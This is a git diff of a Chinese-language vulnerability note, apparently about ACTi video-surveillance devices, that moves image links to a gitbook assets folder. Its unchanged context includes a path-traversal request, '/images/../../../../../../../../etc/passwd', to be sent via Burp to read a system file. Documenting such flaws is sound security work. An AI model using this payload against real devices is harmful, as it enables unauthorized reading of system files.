@@ -20,12 +20,12 @@ app="ACTi-视频监控"
 
 登录页面如下
 
-![](images/202202140926386.png)
+![](../.gitbook/assets/202202140926386.png)
 
 使用Burp抓包
 
-```plain
+```
 /images/../../../../../../../../etc/passwd
 ```
 
-![](images/202202140926873.png)
+![](../.gitbook/assets/202202140926873.png)
